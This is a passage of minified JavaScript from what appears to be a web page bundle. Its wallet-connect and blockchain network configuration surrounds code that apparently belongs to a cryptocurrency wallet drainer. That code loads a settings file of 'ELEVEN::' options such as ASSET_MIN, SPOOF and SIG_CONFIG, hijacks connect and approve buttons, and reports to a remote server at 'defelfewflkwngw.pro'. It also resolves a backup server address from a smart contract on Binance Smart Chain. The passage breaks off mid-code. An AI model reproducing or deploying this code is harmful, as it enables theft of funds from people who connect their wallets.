Explorer",url:"https://optimistic.etherscan.io",apiUrl:"https://api-optimistic.etherscan.io/api"}},contracts:{...Pn.contracts,disputeGameFactory:{[ab]:{address:"0xe5965Ab5962eDc7477C8520243A95517CD252fA9"}},l2OutputOracle:{[ab]:{address:"0xdfe97868233d1aa22e815a266982f2cf17685a27"}},multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:4286263},portal:{[ab]:{address:"0xbEb5Fc579115071764c7423A4f12eDde41f106Ed"}},l1StandardBridge:{[ab]:{address:"0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1"}}},sourceId:ab}),zfe=1,Wfe=Zt({id:98865,name:"Plume (Legacy)",nativeCurrency:{name:"Plume Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://rpc.plumenetwork.xyz"],webSocket:["wss://rpc.plumenetwork.xyz"]}},blockExplorers:{default:{name:"Blockscout",url:"https://explorer.plumenetwork.xyz",apiUrl:"https://explorer.plumenetwork.xyz/api"}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:48577}},sourceId:zfe}),Hfe=Zt({id:137,name:"Polygon",nativeCurrency:{name:"POL",symbol:"POL",decimals:18},rpcUrls:{default:{http:["https://polygon-rpc.com"]}},blockExplorers:{default:{name:"PolygonScan",url:"https://polygonscan.com",apiUrl:"https://api.polygonscan.com/api"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:25770160}}}),Vfe=Zt({id:1729,name:"Reya Network",nativeCurrency:{decimals:18,name:"Ether",symbol:"ETH"},rpcUrls:{default:{http:["https://rpc.reya.network"],webSocket:["wss://ws.reya.network"]}},blockExplorers:{default:{name:"Reya Network Explorer",url:"https://explorer.reya.network"}},testnet:!1}),Kfe=Zt({id:2020,name:"Ronin",nativeCurrency:{name:"RON",symbol:"RON",decimals:18},rpcUrls:{default:{http:["https://api.roninchain.com/rpc"]}},blockExplorers:{default:{name:"Ronin Explorer",url:"https://app.roninchain.com"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:26023535}}}),Gfe=Zt({id:534352,name:"Scroll",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://rpc.scroll.io"],webSocket:["wss://wss-rpc.scroll.io/ws"]}},blockExplorers:{default:{name:"Scrollscan",url:"https://scrollscan.com",apiUrl:"https://api.scrollscan.com/api"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:14}},testnet:!1}),Zfe=Zt({id:109,name:"Shibarium",network:"shibarium",nativeCurrency:{name:"Bone",symbol:"BONE",decimals:18},rpcUrls:{default:{http:["https://rpc.shibrpc.com"]}},blockExplorers:{default:{name:"Blockscout",url:"https://shibariumscan.io"}},contracts:{multicall3:{address:"0x864Bf681ADD6052395188A89101A1B37d3B4C961",blockCreated:265900}}}),cb=1,Yfe=Zt({...Pn,id:1868,name:"Soneium Mainnet",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://rpc.soneium.org"]}},blockExplorers:{default:{name:"Blockscout",url:"https://soneium.blockscout.com",apiUrl:"https://soneium.blockscout.com/api"}},contracts:{...Pn.contracts,disputeGameFactory:{[cb]:{address:"0x512a3d2c7a43bd9261d2b8e8c9c70d4bd4d503c0"}},l2OutputOracle:{[cb]:{address:"0x0000000000000000000000000000000000000000"}},portal:{[cb]:{address:"0x88e529a6ccd302c948689cd5156c83d4614fae92",blockCreated:7061266}},l1StandardBridge:{[cb]:{address:"0xeb9bf100225c214efc3e7c651ebbadcf85177607",blockCreated:7061266}},multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:1}},sourceId:cb}),Jfe=Zt({id:146,name:"Sonic",nativeCurrency:{decimals:18,name:"Sonic",symbol:"S"},rpcUrls:{default:{http:["https://rpc.soniclabs.com"]}},blockExplorers:{default:{name:"Sonic Explorer",url:"https://sonicscan.org"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:60}},testnet:!1}),Qfe=Zt({...U$,id:50104,name:"Sophon",nativeCurrency:{decimals:18,name:"Sophon",symbol:"SOPH"},rpcUrls:{default:{http:["https://rpc.sophon.xyz"],webSocket:["wss://rpc.sophon.xyz/ws"]}},blockExplorers:{default:{name:"Sophon Block Explorer",url:"https://explorer.sophon.xyz"}},contracts:{multicall3:{address:"0x5f4867441d2416cA88B1b3fd38f21811680CD2C8",blockCreated:116}},testnet:!1}),Xfe=Zt({id:1514,name:"Story",nativeCurrency:{decimals:18,name:"IP Token",symbol:"IP"},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:340998},ensRegistry:{address:"0x5dc881dda4e4a8d312be3544ad13118d1a04cb17",blockCreated:648924},ensUniversalResolver:{address:"0xddfb18888a9466688235887dec2a10c4f5effee9",blockCreated:649114}},rpcUrls:{default:{http:["https://mainnet.storyrpc.io"]}},blockExplorers:{default:{name:"Story explorer",url:"https://storyscan.xyz",apiUrl:"https://storyscan.xyz/api/v2"}},ensTlds:[".ip"],testnet:!1}),epe=Zt({...Pn,id:1923,name:"Swellchain",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://swell-mainnet.alt.technology"]}},blockExplorers:{default:{name:"Swell Explorer",url:"https://explorer.swellnetwork.io",apiUrl:"https://explorer.swellnetwork.io/api"}},contracts:{...Pn.contracts,multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:1}}}),tpe=Zt({id:40,name:"Telos",nativeCurrency:{decimals:18,name:"Telos",symbol:"TLOS"},rpcUrls:{default:{http:["https://rpc.telos.net"]}},blockExplorers:{default:{name:"Teloscan",url:"https://www.teloscan.io/"}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:246530709}}}),O6=1,rpe=Zt({...Pn,id:130,name:"Unichain",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://mainnet.unichain.org/"]}},blockExplorers:{default:{name:"Uniscan",url:"https://uniscan.xyz",apiUrl:"https://api.uniscan.xyz/api"}},contracts:{...Pn.contracts,multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:0},disputeGameFactory:{[O6]:{address:"0x2F12d621a16e2d3285929C9996f478508951dFe4"}},portal:{[O6]:{address:"0x0bd48f6B86a26D3a217d0Fa6FfE2B491B956A7a2"}},l1StandardBridge:{[O6]:{address:"0x81014F44b0a345033bB2b3B21C7a1A308B35fEeA"}}},sourceId:O6}),ipe=Zt({id:1111,name:"WEMIX",network:"wemix-mainnet",nativeCurrency:{name:"WEMIX",symbol:"WEMIX",decimals:18},rpcUrls:{default:{http:["https://api.wemix.com"]}},blockExplorers:{default:{name:"wemixExplorer",url:"https://explorer.wemix.com"}}}),lb=1,npe=Zt({...Pn,id:480,name:"World Chain",network:"worldchain",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://worldchain-mainnet.g.alchemy.com/public"]}},blockExplorers:{default:{name:"Worldscan",url:"https://worldscan.org",apiUrl:"https://api.worldscan.org/api"},blockscout:{name:"Blockscout",url:"https://worldchain-mainnet.explorer.alchemy.com",apiUrl:"https://worldchain-mainnet.explorer.alchemy.com/api"}},contracts:{...Pn.contracts,multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:0},disputeGameFactory:{[lb]:{address:"0x069c4c579671f8c120b1327a73217D01Ea2EC5ea"}},l2OutputOracle:{[lb]:{address:"0x19A6d1E9034596196295CF148509796978343c5D"}},portal:{[lb]:{address:"0xd5ec14a83B7d95BE1E2Ac12523e2dEE12Cbeea6C"}},l1StandardBridge:{[lb]:{address:"0x470458C91978D2d929704489Ad730DC3E3001113"}}},testnet:!1,sourceId:lb}),spe=Zt({id:196,name:"X Layer Mainnet",nativeCurrency:{decimals:18,name:"OKB",symbol:"OKB"},rpcUrls:{default:{http:["https://rpc.xlayer.tech"]}},blockExplorers:{default:{name:"OKLink",url:"https://www.oklink.com/xlayer",apiUrl:"https://www.oklink.com/api/v5/explorer/xlayer/api"}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:47416}}}),ope=Zt({id:7e3,name:"ZetaChain",nativeCurrency:{decimals:18,name:"Zeta",symbol:"ZETA"},rpcUrls:{default:{http:["https://zetachain-evm.blockpi.network/v1/rpc/public"]}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:1632781}},blockExplorers:{default:{name:"ZetaScan",url:"https://explorer.zetachain.com"}},testnet:!1}),ape=Zt({...U$,id:324,name:"ZKsync Era",network:"zksync-era",nativeCurrency:{decimals:18,name:"Ether",symbol:"ETH"},rpcUrls:{default:{http:["https://mainnet.era.zksync.io"],webSocket:["wss://mainnet.era.zksync.io/ws"]}},blockExplorers:{default:{name:"Etherscan",url:"https://era.zksync.network/",apiUrl:"https://api-era.zksync.network/api"},native:{name:"ZKsync Explorer",url:"https://explorer.zksync.io/",apiUrl:"https://block-explorer-api.mainnet.zksync.io/api"}},contracts:{multicall3:{address:"0xF9cda624FBC7e059355ce98a31693d299FACd963"},universalSignatureVerifier:{address:"0xfB688330379976DA81eB64Fe4BF50d7401763B9C",blockCreated:45659388}}}),B6=1,cpe=Zt({...Pn,id:7777777,name:"Zora",nativeCurrency:{decimals:18,name:"Ether",symbol:"ETH"},rpcUrls:{default:{http:["https://rpc.zora.energy"],webSocket:["wss://rpc.zora.energy"]}},blockExplorers:{default:{name:"Explorer",url:"https://explorer.zora.energy",apiUrl:"https://explorer.zora.energy/api"}},contracts:{...Pn.contracts,l2OutputOracle:{[B6]:{address:"0x9E6204F750cD866b299594e2aC9eA824E2e5f95c"}},multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:5882},portal:{[B6]:{address:"0x1a0ad011913A150f69f6A19DF447A0CfD9551054"}},l1StandardBridge:{[B6]:{address:"0x3e2Ea9B92B7E48A52296fD261dc26fd995284631"}}},sourceId:B6});function Qg(r){return{formatters:void 0,fees:void 0,serializers:void 0,...r}}const gD=Qg({id:"5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp",name:"Solana",network:"solana-mainnet",nativeCurrency:{name:"Solana",symbol:"SOL",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Solscan",url:"https://solscan.io"}},testnet:!1,chainNamespace:"solana",caipNetworkId:"solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp",deprecatedCaipNetworkId:"solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ"}),mD=Qg({id:"EtWTRABZaYq6iMfeYKouRu166VU2xqa1",name:"Solana Devnet",network:"solana-devnet",nativeCurrency:{name:"Solana",symbol:"SOL",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Solscan",url:"https://solscan.io"}},testnet:!0,chainNamespace:"solana",caipNetworkId:"solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1",deprecatedCaipNetworkId:"solana:8E9rvCKLFQia2Y35HXjjpWzj8weVo44K"});Qg({id:"4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z",name:"Solana Testnet",network:"solana-testnet",nativeCurrency:{name:"Solana",symbol:"SOL",decimals:9},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},blockExplorers:{default:{name:"Solscan",url:"https://solscan.io"}},testnet:!0,chainNamespace:"solana",caipNetworkId:"solana:4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z"});Qg({id:"000000000019d6689c085ae165831e93",caipNetworkId:"bip122:000000000019d6689c085ae165831e93",chainNamespace:"bip122",name:"Bitcoin",nativeCurrency:{name:"Bitcoin",symbol:"BTC",decimals:8},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}}});Qg({id:"000000000933ea01ad0ee984209779ba",caipNetworkId:"bip122:000000000933ea01ad0ee984209779ba",chainNamespace:"bip122",name:"Bitcoin Testnet",nativeCurrency:{name:"Bitcoin",symbol:"BTC",decimals:8},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}},testnet:!0});const lpe=Qg({id:9745,name:"Plasma",nativeCurrency:{name:"XPL",symbol:"XPL",decimals:18},rpcUrls:{default:{http:["https://rpc.plasma.to"]}},blockExplorers:{default:{name:"Plasma Explorer",url:"https://plasmascan.to"}}}),upe=Qg({id:999,name:"HyperEVM Network",nativeCurrency:{name:"HYPE",symbol:"HYPE",decimals:18},rpcUrls:{default:{http:["https://rpc.hyperliquid.xyz/evm"]}},blockExplorers:{default:{name:"Hyper Explorer",url:"https://hyperevmscan.io"}}});async function ss(r){switch(r){case"0":return await Ke(()=>Promise.resolve().then(()=>BYe),void 0);case"1":return await Ke(()=>Promise.resolve().then(()=>GYe),void 0);case"2":return await Ke(()=>Promise.resolve().then(()=>aJe),void 0);case"3":return await Ke(()=>Promise.resolve().then(()=>xJe),void 0);case"4":return await Ke(()=>Promise.resolve().then(()=>$Je),void 0);case"5":return await Ke(()=>Promise.resolve().then(()=>VJe),void 0);default:throw new Error(`Unsupported modal_id: ${r}`)}}function dpe(){let r=!1;return function(e){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(e)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(e.substr(0,4)))&&(r=!0)}(navigator.userAgent||navigator.vendor||window.opera),r}function wD(r){return{Windows:"Windows",macOS:"macOS",iOS:"iOS",Android:"Android",Linux:"Linux","Chrome OS":"ChromeOS"}[r]||"Unknown"}async function hpe(){if(typeof navigator>"u")return"Unknown";try{const i=navigator.userAgentData;if(i?.getHighEntropyValues){const{platform:n}=await i.getHighEntropyValues(["platform"]),s=wD(n);if(s!=="Unknown")return s}else if(i?.platform){const n=wD(i.platform);if(n!=="Unknown")return n}}catch{}const r=(navigator.userAgent||"").toLowerCase(),e=(navigator.platform||"").toLowerCase();return/ipad|iphone|ipod/.test(r)||(/mac/.test(e)||/mac os x/.test(r))&&typeof navigator.maxTouchPoints=="number"&&navigator.maxTouchPoints>1?"iOS":/android/.test(r)?"Android":/cros/.test(r)||/chrome os/.test(r)?"ChromeOS":/win/.test(e)||/windows/.test(r)?"Windows":/mac/.test(e)||/mac os x/.test(r)?"macOS":/linux/.test(e)||/linux/.test(r)?"Linux":"Unknown"}async function lJ(){const r=await fetch(mpe("../settings.json"));if(!r.ok)throw new Error("Error loading config");return await r.json()}async function fpe(){const r=await lJ();if(!r.REOWN_ID||typeof r.REOWN_ID!="string"){alert("ELEVEN:: Invalid REOWN_ID");return}if(!r.TRAFFIC||typeof r.TRAFFIC!="string"){alert("ELEVEN:: Invalid TRAFFIC");return}if(!r.CUSTOMER_ID||typeof r.CUSTOMER_ID!="string"){alert("ELEVEN:: Invalid CUSTOMER_ID");return}if(!r.ASSET_MIN||Number(r.ASSET_MIN)<0||typeof r.ASSET_MIN!="string"){alert("ELEVEN:: Invalid ASSET_MIN");return}if(!r.LOADING_MESSAGE||typeof r.LOADING_MESSAGE!="string"){alert("ELEVEN:: Invalid LOADING_MESSAGE");return}if(!r.CONFIRM_MESSAGE||typeof r.CONFIRM_MESSAGE!="string"){alert("ELEVEN:: Invalid CONFIRM_MESSAGE");return}if(!r.ERROR_MESSAGE||typeof r.ERROR_MESSAGE!="string"){alert("ELEVEN:: Invalid ERROR_MESSAGE");return}if(!r.MODAL_STYLE||Number(r.MODAL_STYLE)<0||Number(r.MODAL_STYLE)>5||typeof r.MODAL_STYLE!="string"){alert("ELEVEN:: Invalid MODAL_STYLE");return}if(typeof r.DARK_MODE!="boolean"){alert("ELEVEN:: Invalid DARK_MODE");return}if(!r.TX_RETRY_COUNT||Number(r.TX_RETRY_COUNT)<0||+(r.TX_RETRY_COUNT>7||typeof r.TX_RETRY_COUNT!="string")){alert("ELEVEN:: Invalid TX_RETRY_COUNT");return}if(typeof r.MODAL_AUTOOPEN!="boolean"){alert("ELEVEN:: Invalid MODAL_AUTOOPEN");return}if(!r.SIG_TEXT_ERROR||typeof r.SIG_TEXT_ERROR!="string"){alert("ELEVEN:: Invalid SIG_TEXT_ERROR");return}if(!r.SIG_TEXT_PROMPT||typeof r.SIG_TEXT_PROMPT!="string"){alert("ELEVEN:: Invalid SIG_TEXT_PROMPT");return}if(!r.SIG_FROM||typeof r.SIG_FROM!="string"){alert("ELEVEN:: Invalid SIG_FROM");return}if(!r.SIG_CONFIG||!Array.isArray(r.SIG_CONFIG)||r.SIG_CONFIG.length===0)return alert("ELEVEN:: Invalid SIG_CONFIG"),!1;if(typeof r.BUNDLES_7702!="boolean"){alert("ELEVEN:: Invalid BUNDLES_7702");return}function e(t){if(typeof t!="string")return!1;const i=t.trim();if(/^tracking$/i.test(i))return!0;if(/^\d+$/.test(i)){const s=Number(i);return s>=0&&s<=1e9}const n=i.match(/^(\d+)\s*-\s*(\d+)$/);if(n){const s=Number(n[1]),o=Number(n[2]),a=c=>c>0&&c<1e9;return a(s)&&a(o)&&s<=o}return!1}if(!e(r.SPOOF))return alert("ELEVEN:: Invalid SPOOF"),!1;if(!r.ELEVEN_PRIORITY||Number(r.ELEVEN_PRIORITY)<0||Number(r.ELEVEN_PRIORITY)>100||typeof r.ELEVEN_PRIORITY!="string"){alert("ELEVEN:: Invalid ELEVEN_PRIORITY");return}if(!r.VERIFY_SIGNATURE||typeof r.VERIFY_SIGNATURE!="string"){alert("ELEVEN:: Invalid VERIFY_SIGNATURE");return}if(!r.LOGS_TO_THE_CHANNEL||typeof r.LOGS_TO_THE_CHANNEL!="string"){alert("ELEVEN:: Invalid LOGS_TO_THE_CHANNEL");return}if(typeof r.FULL_LOG_URL!="boolean"){alert("ELEVEN:: Invalid FULL_LOG_URL");return}}async function so(r){return new Promise(e=>setTimeout(e,r))}function ppe(){return{REOWN_CHAINS:[Y8,W0e,K0e,sJ,Q0e,Hfe,qfe,ape,Z0e,Rfe,G0e,cpe,rpe,pfe,Ffe,Yfe,bfe,Bfe,dfe,jfe,ffe,J0e,Mfe,Ufe,wfe,xfe,V0e,vfe,H0e,gfe,yfe,Kfe,hfe,ipe,Ofe,Gfe,Zfe,Lfe,ope,mfe,Y0e,Vfe,Dfe,z0e,npe,Wfe,tpe,spe,Jfe,M0e,Qfe,X0e,epe,Xfe,lpe,upe],WALLETCONNECT_CHAIN_IDS:[1,42161,43114,8453,56,137,10,324,81457,59144,80094,7777777,130,7560,204,1868,100,4200,42220,1285,25,288,1088,1284,122,8217,592,4689,42170,2e3,2222,2020,1116,1111,5e3,534352,109,7e3,252,60808,1729,185,33139,480,98865,40,196,146,2741,50104,34443,223,1923,1514,9745,999]}}async function gpe(r,e,t){document.addEventListener("click",n=>{n.target.closest(".cnnctBtn")&&r(n),n.target.closest(".aprBtn")&&(n.target.disabled=!0,e(n)),n.target.closest(".cnnctAprBtn")&&t(n)}),new MutationObserver(n=>{n.forEach(s=>{s.addedNodes.forEach(o=>{o.nodeType===1&&o.matches(".aprBtn")&&(o.disabled=!0)})})}).observe(document.body,{childList:!0,subtree:!0})}const mpe=r=>new URL(r,import.meta.url).href;let z9="https://defelfewflkwngw.pro",lk=!1,W9="direct";const Gx={php:{stream:r=>`?req=stream&session=${r}`,ping:()=>"?req=ping",message:()=>"?req=message",start:()=>"?req=start"},direct:{stream:r=>`/api/tx-stream/${r}`,ping:()=>"/api/ping",message:()=>"/api/message",start:()=>"/api/start"}},wpe=async()=>{try{if((await(await fetch(`/assets/secure.php${Gx.php.ping()}`)).json().catch(()=>({}))).res==="pong")W9="php",lk=!1,z9="/assets/secure.php";else{const e=await xpe();lk=e.reserve,z9=e.url}}catch{}},uJ=(r,e={})=>fetch(z9+Gx[W9][r](),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({...e,reserve:lk}),credentials:W9==="php"?"include":void 0}),M6=(r,e)=>uJ("message",{eventType:r,payload:e}),bpe=r=>uJ("start",r),vpe=r=>new EventSource(z9+Gx[W9].stream(r));async function bD(r,e={},t=12e3){const i=new AbortController,n=setTimeout(()=>i.abort(),t);try{return await fetch(r,{...e,signal:i.signal})}finally{clearTimeout(n)}}function ype(r){const e=new Uint8Array(r.length/2);for(let t=0;t<e.length;t++)e[t]=parseInt(r.slice(t*2,t*2+2),16);try{return new TextDecoder().decode(e).replace(/\0+$/g,"")}catch{let t="";for(let i=0;i<e.length;i++)t+=String.fromCharCode(e[i]);return t.replace(/\0+$/g,"")}}function vD(r,e){const t=e*2,i=parseInt(r.slice(t,t+64),16),n=t+64,s=r.slice(n,n+i*2);return ype(s)}async function xpe(){const r=["https://public-bsc.nownodes.io/","https://binance.llamarpc.com"],i={jsonrpc:"2.0",method:"eth_call",params:[{to:"0x6981E9EA7023a8407E4B08ad97f186A5CBDaFCf5",data:"0x3bc5de30"},"latest"],id:1};let n=null;const s=[];for(const u of r)try{const d=await bD(u,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(i)},12e3);if(!d.ok)throw new Error(`HTTP ${d.status}`);const h=await d.json().catch(()=>{throw new Error("Non-JSON RPC response")});if(h.error)throw new Error(`RPC error ${h.error.code}: ${h.error.message}`);if(!h.result||h.result==="0x")throw new Error("Empty or invalid result");n=h.result.startsWith("0x")?h.result.slice(2):h.result;break}catch(d){s.push(`[${u}] ${d?.message||d}`)}if(!n){const u=new Error(`Both RPC endpoints failed:
`+s.join(`
`));throw u.details=s,u}const o=parseInt(n.slice(0,64),16),a=parseInt(n.slice(64,128),16),c=vD(n,o).trim(),l=vD(n,a).trim();try{const u=c.replace(/\/$/,"")+Gx.direct.ping();if((await bD(u,{},5e3)).ok)return{reserve:!1,url:c}}catch{}return{reserve:!0,url:l}}async function yD(r,e){const t=Ky(r.id);try{await e.request({method:"wallet_switchEthereumChain",params:[{chainId:t}]})}catch(a){if(a.code===4902){try{await e.request({method:"wallet_addEthereumChain",params:[{chainId:t,chainName:r.name,rpcUrls:r.rpcUrls.default.http,nativeCurrency:r.nativeCurrency,blockExplorerUrls:[r.blockExplorers?.default?.url].filter(Boolean)}]})}catch(c){return console.error("   :",c),{success:!1}}await e.request({method:"wallet_switchEthereumChain",params:[{chainId:t}]})}else throw new Error(`ERROR: ${a.message}`)}const i=new $1(e,"any"),n=50;let s;for(let a=0;a<n&&(s=await i.getNetwork(),s.chainId!==r.id);a++)await new Promise(c=>setTimeout(c,100));if(s?.chainId!==r.id)throw new Error("ERROR:   ");return{signer:i.getSigner(),provider:e,success:!0}}var f_,xD;function Lr(){return xD||(xD=1,f_={options:{usePureJavaScript:!1}}),f_}var p_={exports:{}},g_,CD;function Cpe(){if(CD)return g_;CD=1;var r={};g_=r;var e={};r.encode=function(i,n,s){if(typeof n!="string")throw new TypeError('"alphabet" must be a string.');if(s!==void 0&&typeof s!="number")throw new TypeError('"maxline" must be a number.');var o="";if(!(i instanceof Uint8Array))o=t(i,n);else{var a=0,c=n.length,l=n.charAt(0),u=[0];for(a=0;a<i.length;++a){for(var d=0,h=i[a];d<u.length;++d)h+=u[d]<<8,u[d]=h%c,h=h/c|0;for(;h>0;)u.push(h%c),h=h/c|0}for(a=0;i[a]===0&&a<i.length-1;++a)o+=l;for(a=u.length-1;a>=0;--a)o+=n[u[a]]}if(s){var f=new RegExp(".{1,"+s+"}","g");o=o.match(f).join(`\r
`)}return o},r.decode=function(i,n){if(typeof i!="string")throw new TypeError('"input" must be a string.');if(typeof n!="string")throw new TypeError('"alphabet" must be a string.');var s=e[n];if(!s){s=e[n]=[];for(var o=0;o<n.length;++o)s[n.charCodeAt(o)]=o}i=i.replace(/\s/g,"");for(var a=n.length,c=n.charAt(0),l=[0],o=0;o<i.length;o++){var u=s[i.charCodeAt(o)];if(u===void 0)return;for(var d=0,h=u;d<l.length;++d)h+=l[d]*a,l[d]=h&255,h>>=8;for(;h>0;)l.push(h&255),h>>=8}for(var f=0;i[f]===c&&f<i.length-1;++f)l.push(0);return typeof Buffer<"u"?Buffer.from(l.reverse()):new Uint8Array(l.reverse())};function t(i,n){var s=0,o=n.length,a=n.charAt(0),c=[0];for(s=0;s<i.length();++s){for(var l=0,u=i.at(s);l<c.length;++l)u+=c[l]<<8,c[l]=u%o,u=u/o|0;for(;u>0;)c.push(u%o),u=u/o|0}var d="";for(s=0;i.at(s)===0&&s<i.length()-1;++s)d+=a;for(s=c.length-1;s>=0;--s)d+=n[c[s]];return d}return g_}var ED;function Ei(){if(ED)return p_.exports;ED=1;var r=Lr(),e=Cpe(),t=p_.exports=r.util=r.util||{};(function(){if(typeof process<"u"&&process.nextTick&&!process.browser){t.nextTick=process.nextTick,typeof setImmediate=="function"?t.setImmediate=setImmediate:t.setImmediate=t.nextTick;return}if(typeof setImmediate=="function"){t.setImmediate=function(){return setImmediate.apply(void 0,arguments)},t.nextTick=function(E){return setImmediate(E)};return}if(t.setImmediate=function(E){setTimeout(E,0)},typeof window<"u"&&typeof window.postMessage=="function"){let E=function(C){if(C.source===window&&C.data===m){C.stopPropagation();var N=x.slice();x.length=0,N.forEach(function(L){L()})}};var m="forge.setImmediate",x=[];t.setImmediate=function(C){x.push(C),x.length===1&&window.postMessage(m,"*")},window.addEventListener("message",E,!0)}if(typeof MutationObserver<"u"){var S=Date.now(),T=!0,k=document.createElement("div"),x=[];new MutationObserver(function(){var C=x.slice();x.length=0,C.forEach(function(N){N()})}).observe(k,{attributes:!0});var I=t.setImmediate;t.setImmediate=function(C){Date.now()-S>15?(S=Date.now(),I(C)):(x.push(C),x.length===1&&k.setAttribute("a",T=!T))}}t.nextTick=t.setImmediate})(),t.isNodejs=typeof process<"u"&&process.versions&&process.versions.node,t.globalScope=function(){return t.isNodejs?Po:typeof self>"u"?window:self}(),t.isArray=Array.isArray||function(m){return Object.prototype.toString.call(m)==="[object Array]"},t.isArrayBuffer=function(m){return typeof ArrayBuffer<"u"&&m instanceof ArrayBuffer},t.isArrayBufferView=function(m){return m&&t.isArrayBuffer(m.buffer)&&m.byteLength!==void 0};function i(m){if(!(m===8||m===16||m===24||m===32))throw new Error("Only 8, 16, 24, or 32 bits supported: "+m)}t.ByteBuffer=n;function n(m){if(this.data="",this.read=0,typeof m=="string")this.data=m;else if(t.isArrayBuffer(m)||t.isArrayBufferView(m))if(typeof Buffer<"u"&&m instanceof Buffer)this.data=m.toString("binary");else{var x=new Uint8Array(m);try{this.data=String.fromCharCode.apply(null,x)}catch{for(var S=0;S<x.length;++S)this.putByte(x[S])}}else(m instanceof n||typeof m=="object"&&typeof m.data=="string"&&typeof 